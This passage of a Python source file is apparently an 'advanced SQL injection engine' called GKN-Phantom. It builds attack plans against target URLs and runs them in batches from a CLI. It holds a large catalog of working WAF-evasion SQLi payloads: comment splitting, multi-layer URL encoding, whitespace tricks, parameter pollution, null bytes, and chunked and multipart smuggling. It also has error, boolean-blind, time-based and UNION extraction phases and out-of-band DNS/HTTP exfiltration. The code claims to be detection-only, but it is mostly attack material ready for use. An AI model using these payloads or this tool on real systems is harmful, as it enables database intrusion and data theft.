    "cleanup_note": "Delete or revert any stored test data after detection to avoid persistent artifacts.",
}

# =============================================================================
# WAF Bypass Payloads — SQLi-specific
# =============================================================================
WAF_BYPASS_PAYLOADS = {
    "inline_comments": {
        "technique": "Insert inline comments to break signature patterns",
        "description": "Most WAFs look for keywords like UNION SELECT, ORDER BY. Inline comments break the token stream without affecting SQL parsing.",
        "variants": [
            {"name": "keyword_split", "payload": "'/**/UNION/**/SELECT/**/1,2,3-- ", "targets": "UNION SELECT"},
            {"name": "function_split", "payload": "AND/**/SLEEP(2)-- ", "targets": "SLEEP function"},
            {"name": "operator_split", "payload": "1'/**/OR/**/1=1-- ", "targets": "OR operator"},
            {"name": "random_comment", "payload": "/**/UNI/**/ON/**/SELE/**/CT/**/1,2,3-- ", "targets": "UNION SELECT with random splits"},
            {"name": "versioned_comment_mysql", "payload": "/*!50000UNION*//*!50000SELECT*/ 1,2,3-- ", "targets": "MySQL versioned comment evasion"},
        ],
    },
    "url_encoding": {
        "technique": "URL-encode SQL keywords to bypass pattern-matching WAFs",
        "description": "Single and double URL encoding of SQL metacharacters and keywords.",
        "variants": [
            {"name": "quote_encode", "payload": "%27%20AND%201=1--%20", "targets": "quote character"},
            {"name": "space_encode", "payload": "1'%20AND%201=1--%20", "targets": "space replaced with %20"},
            {"name": "keyword_encode", "payload": "1%27%20%55%4e%49%4f%4e%20%53%45%4c%45%43%54%201,2,3--%20", "targets": "UNION SELECT hex-encoded"},
            {"name": "full_encode", "payload": "%31%27%20%41%4e%44%20%31%3d%31%2d%2d%20", "targets": "full URL-encoded payload"},
        ],
    },
    "double_encoding": {
        "technique": "Double URL-encode payload (WAF decodes once, app decodes twice)",
        "description": "If the WAF decodes once but the app server decodes again, the WAF sees encoded while the app sees raw SQL.",
        "variants": [
            {"name": "double_quote", "payload": "%2527%2520AND%25201=1--%2520", "targets": "single quote (%27 -> %2527)"},
            {"name": "double_space", "payload": "1'%2520AND%25201=1--%2520", "targets": "space double-encoded"},
            {"name": "triple_encode", "payload": "%252527%252520AND%2525201=1--%252520", "targets": "triple encoding (some decoders chain)"},
        ],
    },
    "case_variation": {
        "technique": "Randomize case of SQL keywords (SeLeCt, UnIoN, etc.)",
        "description": "SQL keywords are case-insensitive but WAF signatures are often case-sensitive.",
        "variants": [
            {"name": "random_case", "payload": "' UnIoN SeLeCt 1,2,3-- ", "targets": "UNION SELECT keywords"},
            {"name": "mixed_case", "payload": "' uNiOn sElEcT 1,2,3-- ", "targets": "all keywords mixed case"},
            {"name": "camel_case", "payload": "' Union Select 1,2,3-- ", "targets": "capitalized keywords"},
            {"name": "upper_lower", "payload": "' UNiOn SEleCt 1,2,3-- ", "targets": "per-letter alternation"},
        ],
    },
    "whitespace_alternatives": {
        "technique": "Replace spaces with alternative whitespace characters",
        "description": "Many WAFs tokenize on ASCII 0x20 space but SQL accepts other whitespace (0x09 TAB, 0x0A LF, 0x0D CR, 0x0C FF, 0xA0 NBSP, 0x0B VT).",
        "variants": [
            {"name": "tab", "payload": "1'\tAND\t1=1--%09", "url_form": "1'%09AND%091=1--%09", "char": "%09 (TAB)"},
            {"name": "newline", "payload": "1'\nAND\n1=1--%0a", "url_form": "1'%0aAND%0a1=1--%0a", "char": "%0a (LF)"},
            {"name": "carriage_return", "payload": "1'\rAND\r1=1--%0d", "url_form": "1'%0dAND%0d1=1--%0d", "char": "%0d (CR)"},
            {"name": "form_feed", "payload": "1'\fAND\f1=1--%0c", "url_form": "1'%0cAND%0c1=1--%0c", "char": "%0c (FF)"},
            {"name": "nbsp", "payload": "1' AND 1=1--%a0", "url_form": "1'%a0AND%a01=1--%a0", "char": "%a0 (non-breaking space)"},
            {"name": "vertical_tab", "payload": "1'\vAND\v1=1--%0b", "url_form": "1'%0bAND%0b1=1--%0b", "char": "%0b (VT)"},
            {"name": "crlf_combo", "payload": "1'%0d%0aAND%0d%0a1=1--%0d%0a", "url_form": "1'%0d%0aAND%0d%0a1=1--%0d%0a", "char": "%0d%0a (CRLF)"},
            {"name": "multi_whitespace", "payload": "1'%09%0a%0dAND%09%0a%0d1=1--%09%0a%0d", "url_form": "1'%09%0a%0dAND%09%0a%0d1=1--%09%0a%0d", "char": "multi-whitespace combo"},
        ],
    },
    "scientific_notation": {
        "technique": "Use scientific notation to bypass integer-only filters",
        "description": "Some WAFs block numeric comparison operators. Scientific notation (1e0, 1.e0) is a valid SQL numeric literal that may bypass.",
        "variants": [
            {"name": "sci_eq", "payload": "1' AND 1e0=1e0-- ", "targets": "AND 1=1 equivalent"},
            {"name": "sci_false", "payload": "1' AND 1e0=2e0-- ", "targets": "AND 1=2 equivalent"},
            {"name": "sci_paren", "payload": "1' AND (1).e(0)=(1).e(0)-- ", "targets": "parenthesized scientific notation"},
            {"name": "sci_union", "payload": "1' UNION ALL SELECT 1e0,1e0,1e0-- ", "targets": "UNION SELECT with scientific notation"},
        ],
    },
    "http_parameter_pollution": {
        "technique": "Send the same parameter multiple times to confuse WAF parsing",
        "description": "Some WAFs inspect only the first or last occurrence of a parameter, while the application may concatenate or pick a different one.",
        "variants": [
            {"name": "hpp_split", "plan": "Send id=1 (safe) AND id=' OR 1=1-- (payload). WAF sees safe; app concatenates.", "params": {"id": ["1", "' OR 1=1-- "]}},
            {"name": "hpp_concat", "plan": "Send id=1%27 (partial) AND id=OR 1=1-- (rest). App concatenates them.", "params": {"id": ["1%27", "OR 1=1-- "]}},
            {"name": "hpp_duplicate", "plan": "Send id=1 AND id=' UNION SELECT 1,2,3--. App may use the second value.", "params": {"id": ["1", "' UNION SELECT 1,2,3-- "]}},
        ],
    },
    "null_byte_injection": {
        "technique": "Insert null byte (%00) before payload to truncate WAF inspection",
        "description": "Some WAFs are written in C and stop processing at null byte, while the app (Java/PHP) may ignore it.",
        "variants": [
            {"name": "null_prefix", "payload": "%00' AND 1=1-- ", "targets": "null byte before quote"},
            {"name": "null_mid", "payload": "1'%00 AND 1=1-- ", "targets": "null byte after quote before space"},
            {"name": "null_comment", "payload": "1'/**%00*/AND 1=1-- ", "targets": "null byte inside comment block"},
        ],
    },
    "alternative_logical_operators": {
        "technique": "Use alternative logical operators to bypass AND/OR filters",
        "description": "Replace AND/OR with equivalent operators: &&, ||, &&, ^, |, &.",
        "variants": [
            {"name": "ampersand_and", "payload": "1' && 1=1-- ", "targets": "AND replaced with &&"},
            {"name": "pipe_or", "payload": "1' || 1=1-- ", "targets": "OR replaced with || (MySQL: PIPES_AS_CONCAT must be off)"},
            {"name": "xor", "payload": "1' XOR 1=1-- ", "targets": "XOR operator (true when exactly one is true)"},
            {"name": "not_not", "payload": "1' AND NOT 1<>1-- ", "targets": "NOT 1<>1 is equivalent to 1=1"},
            {"name": "greatest", "payload": "1' AND GREATEST(1,1)=1-- ", "targets": "GREATEST(1,1)=1 equivalent to 1=1"},
        ],
    },
    "http_method_tampering": {
        "technique": "Change HTTP method to bypass WAF inspection (GET -> POST, etc.)",
        "description": "Some WAFs inspect only GET parameters but the application accepts POST or vice versa.",
        "variants": [
            {"name": "get_to_post", "method": "POST", "content_type": "application/x-www-form-urlencoded"},
            {"name": "post_to_get", "method": "GET"},
            {"name": "put_method", "method": "PUT", "content_type": "application/x-www-form-urlencoded"},
        ],
    },
    "chunked_transfer": {
        "technique": "Use chunked Transfer-Encoding to fragment payload",
        "description": "Chunked transfer encoding splits the request body into chunks; some WAFs don't reassemble before inspection.",
        "variants": [
            {"name": "chunked_body", "payload": "id=%27%20UNION%20SELECT%201,2,3--%20", "headers": {"Transfer-Encoding": "chunked"}},
        ],
    },
    "multipart_bypass": {
        "technique": "Use multipart/form-data to hide payload from WAF",
        "description": "Some WAFs don't inspect multipart body fields as thoroughly as URL-encoded parameters.",
        "variants": [
            {"name": "multipart_param", "content_type": "multipart/form-data; boundary=----PTSKILLTEST", "field_name": "id", "payload": "' UNION SELECT 1,2,3-- "},
        ],
    },
    "json_content_type": {
        "technique": "Switch Content-Type to application/json to bypass URL-encoded WAF rules",
        "description": "Many WAFs have separate rule sets per content type. JSON payloads may be less inspected.",
        "variants": [
            {"name": "json_body", "content_type": "application/json", "payload": "{\"id\": \"1' UNION SELECT 1,2,3-- \"}"},
        ],
    },
}

# =============================================================================
# Dataclass for the SQLi Plan
# =============================================================================
@dataclass
class SQLiPlan:
    """A structured SQL injection detection and extraction plan."""
    detection_phase: dict = field(default_factory=dict)
    extraction_phase: dict = field(default_factory=dict)
    payloads: list = field(default_factory=list)
    db_fingerprint_result: dict | None = None
    target: dict = field(default_factory=dict)
    notes: str = ""


# =============================================================================
# Plan Builders
# =============================================================================
def _select_db_engines(db_type: str) -> list[str]:
    """Resolve db_type to a list of engine keys to test.

    Args:
        db_type: 'auto' | 'mysql' | 'postgresql' | 'mssql' | 'oracle' | 'sqlite' | 'mariadb'

    Returns:
        Ordered list of DB engine keys. 'auto' returns all in priority order.
    """
    auto_order = ["mysql", "postgresql", "mssql", "oracle", "sqlite", "mariadb"]
    if db_type in (None, "", "auto"):
        return auto_order
    db_type = db_type.lower()
    if db_type in auto_order:
        return [db_type]
    # Unknown: fall back to auto
    return auto_order


def build_detection_phase(target: dict, db_type: str, method: str) -> dict:
    """Build the detection phase of the SQLi plan.

    The detection phase determines IF injection is possible and WHICH DB engine
    is in use, using error-based, boolean-based, and time-based probes.

    Args:
        target: dict with 'url' key
        db_type: 'auto' or specific DB engine
        method: HTTP method for the probe

    Returns:
        Detection phase dict with steps, error probes, boolean probes, time probes.
    """
    engines = _select_db_engines(db_type)

    phase: dict = {
        "objective": "Confirm SQL injection vulnerability and identify database engine",
        "steps": [
            "1. Baseline: Send clean request, record response length/status/time",
            "2. Error probe: Send quote character, check for DB error signatures",
            "3. Boolean probe: Send TRUE/FALSE differential, compare responses",
            "4. Time probe: Send sleep payload, measure response time delta",
            "5. DB fingerprint: Match error signature + version extraction to engine",
        ],
        "error_probes": [],
        "boolean_probes": [],
        "time_probes": [],
        "db_fingerprint_probes": [],
        "engine_priority": engines,
    }

    url = target.get("url", "")
    param = target.get("param", "id")

    # Error probes — generic quote injection
    error_generic = [
        {"payload": "PTSKILLTEST'", "signal": "SQL error signature in response", "category": "quote"},
        {"payload": 'PTSKILLTEST"', "signal": "SQL error (double quote)", "category": "double_quote"},
        {"payload": "PTSKILLTEST';-- ", "signal": "SQL error from semicolon+quote", "category": "semicolon_quote"},
        {"payload": "1'", "signal": "SQL error from bare quote", "category": "bare_quote"},
        {"payload": "1')-- ", "signal": "SQL error from close-paren+quote", "category": "parenthesized_quote"},
    ]
    phase["error_probes"] = error_generic

    # Boolean probes — generic
    for cat in ["true_condition", "false_condition"]:
        for payload in BOOLEAN_BLIND_PAYLOADS.get(cat, {}).get("generic", []):
            phase["boolean_probes"].append({
                "category": cat,
                "payload": payload["payload"],
                "type": payload["type"],
                "signal": "TRUE response matches baseline" if cat == "true_condition" else "FALSE response differs from TRUE",
            })

    # Time probes — pick one per engine
    for engine in engines:
        tprobes = TIME_BASED_PAYLOADS.get(engine, [])
        if tprobes:
            # Use the first (most standard) sleep payload for detection
            p = tprobes[0]
            phase["time_probes"].append({
                "engine": engine,
                "name": p["name"],
                "payload": p["payload"],
                "threshold_seconds": p["threshold_seconds"],
                "max_seconds": p["max_seconds"],
                "signal": f"Response time >= {p['threshold_seconds']}s (baseline + delta)",
            })

    # DB fingerprint probes — error signatures per engine
    for engine in engines:
        fp = DB_FINGERPRINT.get(engine, {})
        phase["db_fingerprint_probes"].append({
            "engine": engine,
            "error_signatures": fp.get("error_signatures", []),
            "version_payload": fp.get("version_payloads", [{}])[0].get("payload", "") if fp.get("version_payloads") else "",
            "comment_syntax": [c["syntax"] for c in fp.get("comment_syntax", [])],
            "default_port": fp.get("default_port"),
        })

    return phase


def build_extraction_phase(target: dict, db_type: str, vuln_type: str) -> dict:
    """Build the extraction (proof-of-concept) phase of the SQLi plan.

    The extraction phase demonstrates that data CAN be extracted without actually
    exfiltrating real data. Uses error-based, boolean blind char extraction,
    time-based inference, UNION, and OOB techniques.

    Args:
        target: dict with 'url' key
        db_type: specific or 'auto' DB engine
        vuln_type: 'error_based' | 'boolean_blind' | 'time_based' | 'union' | 'oob' | 'all'

    Returns:
        Extraction phase dict with categorized proof payloads.
    """
    engines = _select_db_engines(db_type)

    phase: dict = {
        "objective": "Demonstrate data extractability without exfiltrating real data",
        "proof_types": [],
        "payloads": [],
    }

    if vuln_type in ("error_based", "all"):
        phase["proof_types"].append("error_based")
        phase["payloads"].append({
            "category": "error_based_extraction",
            "description": "Trigger DB-specific errors that embed version/target info in the error message",
            "techniques": [],
        })
        for engine in engines:
            eprobes = ERROR_BASED_PAYLOADS.get(engine, [])
            if eprobes:
                phase["payloads"][-1]["techniques"].append({
                    "engine": engine,
                    "payloads": eprobes,
                })

    if vuln_type in ("boolean_blind", "all"):
        phase["proof_types"].append("boolean_blind")
        phase["payloads"].append({
            "category": "boolean_blind_extraction",
            "description": "Character-by-character extraction using substr/ascii binary search",
            "extraction_plan": BOOLEAN_EXTRACTION_PLAN,
        })

    if vuln_type in ("time_based", "all"):
        phase["proof_types"].append("time_based")
        phase["payloads"].append({
            "category": "time_based_extraction",
            "description": "Time-based inference for conditional data extraction",
            "inference_logic": TIME_INFERENCE,
            "payloads_by_engine": {},
        })
        for engine in engines:
            tprobes = TIME_BASED_PAYLOADS.get(engine, [])
            if tprobes:
                phase["payloads"][-1]["payloads_by_engine"][engine] = tprobes

    if vuln_type in ("union", "all"):
        phase["proof_types"].append("union")
        phase["payloads"].append({
            "category": "union_based_extraction",
            "description": "UNION SELECT for column count discovery and data concatenation",
            "column_discovery": UNION_PAYLOADS["column_discovery"],
            "null_union": UNION_PAYLOADS["null_union"],
            "type_compatibility": UNION_PAYLOADS["type_compatibility"],
            "data_concat": UNION_PAYLOADS["data_concat"],
            "prebuilt_payloads": {},
        })
        for engine in engines:
            uprobes = UNION_SELECT_PAYLOADS.get(engine, [])
            if uprobes:
                phase["payloads"][-1]["prebuilt_payloads"][engine] = uprobes

    if vuln_type in ("oob", "all"):
        phase["proof_types"].append("oob")
        phase["payloads"].append({
            "category": "oob_extraction",
            "description": "Out-of-band DNS/HTTP exfiltration to callback sink",
            "note": "OOB techniques require an authorized callback sink (ctx.config.oob_sink). They are L4 and require human approval.",
            "payloads_by_engine": {},
        })
        for engine in engines:
            oprobes = OOB_PAYLOADS.get(f"{engine}_windows_unc") or OOB_PAYLOADS.get(engine, [])
            if oprobes:
                phase["payloads"][-1]["payloads_by_engine"][engine] = oprobes

    return phase


def build_sqli_plan(
    target: dict,
    db_type: str = "auto",
    method: str = "GET",
    vuln_type: str = "all",
    include_waf_bypass: bool = True,
    include_second_order: bool = True,
) -> dict:
    """Build a comprehensive SQL injection detection and extraction plan.

    Args:
        target: dict with at least 'url', optionally 'param', 'headers', 'data'
        db_type: 'auto' | 'mysql' | 'postgresql' | 'mssql' | 'oracle' | 'sqlite' | 'mariadb'
        method: HTTP method (GET, POST)
        vuln_type: 'error_based' | 'boolean_blind' | 'time_based' | 'union' | 'oob' | 'all'
        include_waf_bypass: include WAF bypass payload variants
        include_second_order: include second-order SQLi detection patterns

    Returns:
        Structured injection plan dict:
        {
            target: {...},
            db_type: str,
            detection_phase: {...},
            extraction_phase: {...},
            waf_bypass_payloads: [...],
            second_order_patterns: {...},
            payloads: [...],  # flat list of all payloads for easy iteration
            db_fingerprint_result: null,  # populated after detection phase
            notes: str
        }
    """
    detection = build_detection_phase(target, db_type, method)
    extraction = build_extraction_phase(target, db_type, vuln_type)

    # Flatten all payloads into a single iterable list
    all_payloads: list = []

    # From detection phase
    for p in detection.get("error_probes", []):
        all_payloads.append({"phase": "detection", "category": "error", **p})
    for p in detection.get("boolean_probes", []):
        all_payloads.append({"phase": "detection", "category": "boolean", **p})
    for p in detection.get("time_probes", []):
        all_payloads.append({"phase": "detection", "category": "time", **p})

    # From extraction phase
    for block in extraction.get("payloads", []):
        cat = block.get("category", "")
        if cat == "error_based_extraction":
            for tech in block.get("techniques", []):
                for p in tech.get("payloads", []):
                    all_payloads.append({
                        "phase": "extraction", "category": "error_based",
                        "engine": tech["engine"], **p,
                    })
        elif cat == "time_based_extraction":
            for eng, plist in block.get("payloads_by_engine", {}).items():
                for p in plist:
                    all_payloads.append({
                        "phase": "extraction", "category": "time_based",
                        "engine": eng, **p,
                    })
        elif cat == "union_based_extraction":
            for eng, plist in block.get("prebuilt_payloads", {}).items():
                for p in plist:
                    all_payloads.append({
                        "phase": "extraction", "category": "union",
                        "engine": eng, **p,
                    })
        elif cat == "oob_extraction":
            for eng, plist in block.get("payloads_by_engine", {}).items():
                for p in plist:
                    all_payloads.append({
                        "phase": "extraction", "category": "oob",
                        "engine": eng, **p,
                    })

    # WAF bypass payloads (flat)
    waf_bypass = None
    if include_waf_bypass:
        waf_bypass = WAF_BYPASS_PAYLOADS
        for technique_name, technique_data in WAF_BYPASS_PAYLOADS.items():
            for variant in technique_data.get("variants", []):
                entry = {
                    "phase": "waf_bypass",
                    "technique": technique_name,
                    "technique_description": technique_data.get("description", ""),
                    **variant,
                }
                all_payloads.append(entry)

    # Second-order patterns
    second_order = None
    if include_second_order:
        second_order = SECOND_ORDER_PAYLOADS
        for marker in SECOND_ORDER_PAYLOADS.get("injection_markers", []):
            all_payloads.append({
                "phase": "second_order",
                "category": "injection_marker",
                **marker,
            })

    plan = {
        "target": target,
        "db_type": db_type,
        "detection_phase": detection,
        "extraction_phase": extraction,
        "waf_bypass_payloads": waf_bypass,
        "second_order_patterns": second_order,
        "payloads": all_payloads,
        "db_fingerprint_result": None,
        "notes": (
            "ALL PAYLOADS ARE DETECTION-ONLY. No DROP/TRUNCATE/DELETE. "
            "No actual data exfiltration — only proof of extractability. "
            "Time-based probes capped at 5s max. OOB probes require an authorized callback sink."
        ),
    }
    return plan


# =============================================================================
# Batch Processing
# =============================================================================
def process_batch(batch_file: str) -> list[dict]:
    """Process a batch targets JSON file and return a plan per target.

    Expected batch file format:
    [
        {"url": "http://target1.com/page?id=1", "param": "id", "method": "GET", "db_type": "auto"},
        {"url": "http://target2.com/api/users", "param": "username", "method": "POST", "db_type": "mysql"},
        ...
    ]

    Args:
        batch_file: path to JSON file or '-' for stdin

    Returns:
        List of plan dicts, one per target.
    """
    targets = load_json(batch_file)
    if isinstance(targets, dict):
        targets = [targets]
    plans = []
    for t in targets:
        plans.append(build_sqli_plan(
            target=t,
            db_type=t.get("db_type", "auto"),
            method=t.get("method", "GET"),
            vuln_type=t.get("vuln_type", "all"),
            include_waf_bypass=t.get("include_waf_bypass", True),
            include_second_order=t.get("include_second_order", True),
        ))
    return plans


# =============================================================================
# Payload Generation (for standalone payload catalog)
# =============================================================================
def generate_payloads(vuln_type: str, db_type: str = "auto") -> dict:
    """Generate a focused payload catalog for a specific vulnerability type and DB.

    Args:
        vuln_type: 'error_based' | 'boolean_blind' | 'time_based' | 'union' | 'oob'
                   | 'second_order' | 'waf_bypass'
        db_type: specific DB engine or 'auto' for all

    Returns:
        Payload catalog dict.
    """
    engines = _select_db_engines(db_type)

    if vuln_type == "error_based":
        result: dict = {"vuln_type": "error_based", "payloads": {}}
        for eng in engines:
            probs = ERROR_BASED_PAYLOADS.get(eng, [])
            if probs:
                result["payloads"][eng] = probs
        return result

    if vuln_type == "boolean_blind":
        result = {"vuln_type": "boolean_blind", "payloads": {}, "extraction_plan": BOOLEAN_EXTRACTION_PLAN}
        for cat in ["true_condition", "false_condition"]:
            section = BOOLEAN_BLIND_PAYLOADS.get(cat, {})
            result["payloads"][cat] = {}
            result["payloads"][cat]["generic"] = section.get("generic", [])
            for eng in engines:
                result["payloads"][cat][eng] = section.get(eng, [])
        return result

    if vuln_type == "time_based":
        result = {"vuln_type": "time_based", "payloads": {}, "inference_logic": TIME_INFERENCE}
        for eng in engines:
            tprobes = TIME_BASED_PAYLOADS.get(eng, [])
            if tprobes:
                result["payloads"][eng] = tprobes
        return result

    if vuln_type == "union":
        result = {
            "vuln_type": "union",
            "column_discovery": UNION_PAYLOADS["column_discovery"],
            "null_union": UNION_PAYLOADS["null_union"],
            "type_compatibility": UNION_PAYLOADS["type_compatibility"],
            "data_concat": UNION_PAYLOADS["data_concat"],
            "prebuilt_payloads": {},
        }
        for eng in engines:
            uprobes = UNION_SELECT_PAYLOADS.get(eng, [])
            if uprobes:
                result["prebuilt_payloads"][eng] = uprobes
        return result

    if vuln_type == "oob":
        result = {"vuln_type": "oob", "payloads": {}}
        for eng in engines:
            oprobes = OOB_PAYLOADS.get(f"{eng}_windows_unc") or OOB_PAYLOADS.get(eng, [])
            if oprobes:
                result["payloads"][eng] = oprobes
        return result

    if vuln_type == "second_order":
        return {"vuln_type": "second_order", **SECOND_ORDER_PAYLOADS}

    if vuln_type == "waf_bypass":
        return {"vuln_type": "waf_bypass", **WAF_BYPASS_PAYLOADS}

    return {"error": f"Unknown vuln_type: {vuln_type}", "supported": [
        "error_based", "boolean_blind", "time_based", "union", "oob",
        "second_order", "waf_bypass",
    ]}


# =============================================================================
# CLI
# =============================================================================
def main() -> int:
    ap = argparse.ArgumentParser(
        description="Advanced SQL Injection Engine — GKN-Phantom v3.0",
        formatter_class=argparse.RawDescriptionHelpFormatter,
        epilog=(
            "Examples:\n"
            "  python advanced_sqli.py --url \"http://target.com/page.php?id=1\" --param id --method GET\n"
            "  python advanced_sqli.py --url \"http://target.com/page.php?id=1\" --db-type mysql\n"
            "  python advanced_sqli.py --generate-payloads --vuln-type boolean_blind --db-type mysql\n"
            "  python advanced_sqli.py --batch targets.json\n"
        ),
    )

    ap.add_argument(
        "--url", type=str, default=None,
        help="Target URL (with or without query string)",
    )
    ap.add_argument(
        "--param", type=str, default="id",
        help="Vulnerable parameter name (default: id)",
    )
    ap.add_argument(
        "--method", type=str, default="GET",
        choices=["GET", "POST"],
        help="HTTP method (default: GET)",
    )
    ap.add_argument(
        "--db-type", type=str, default="auto",
        choices=["auto", "mysql", "postgresql", "mssql", "oracle", "sqlite", "mariadb"],
        help="Target database type, or 'auto' to probe all (default: auto)",
    )
    ap.add_argument(
        "--vuln-type", type=str, default="all",
        choices=["all", "error_based", "boolean_blind", "time_based", "union", "oob",
                 "second_order", "waf_bypass"],
        help="Vulnerability type for extraction phase (default: all)",
    )
    ap.add_argument(
        "--no-waf-bypass", action="store_true",
        help="Exclude WAF bypass payloads from plan",
    )
    ap.add_argument(
        "--no-second-order", action="store_true",
        help="Exclude second-order SQLi patterns from plan",
    )
    ap.add_argument(
        "--generate-payloads", action="store_true",
        help="Generate standalone payload catalog instead of full plan",
    )
    ap.add_argument(
        "--batch", type=str, default=None,
        help="Path to batch targets JSON file (or '-' for stdin)",
    )
    ap.add_argument(
        "--output", type=str, default=None,
        help="Write output to file instead of stdout",
    )

    args = ap.parse_args()

    # Batch mode
    if args.batch:
        plans = process_batch(args.batch)
        output = dump_json(plans)
        if args.output:
            with open(args.output, "w", encoding="utf-8") as fh:
                fh.write(output)
        else:
            print(output)
        return 0

    # Payload generation mode
    if args.generate_payloads:
        catalog = generate_payloads(args.vuln_type, args.db_type)
        output = dump_json(catalog)
        if args.output:
            with open(args.output, "w", encoding="utf-8") as fh:
                fh.write(output)
        else:
            print(output)
        return 0 if "error" not in catalog else 1

    # Single target mode
    if not args.url:
        ap.error("--url is required (or use --batch or --generate-payloads)")

    target = {
        "url": args.url,
        "param": args.param,
        "method": args.method,
    }

    plan = build_sqli_plan(
        target=target,
        db_type=args.db_type,
        method=args.method,
        vuln_type=args.vuln_type,
        include_waf_bypass=not args.no_waf_bypass,
        include_second_order=not args.no_second_order,
    )

    output = dump_json(plan)
    if args.output:
        with open(args.output, "w", encoding="utf-8") as fh:
            fh.write(output)
    else:
        print(output)

    return 0


if __name__ == "__main__":
    sys.exit(main())
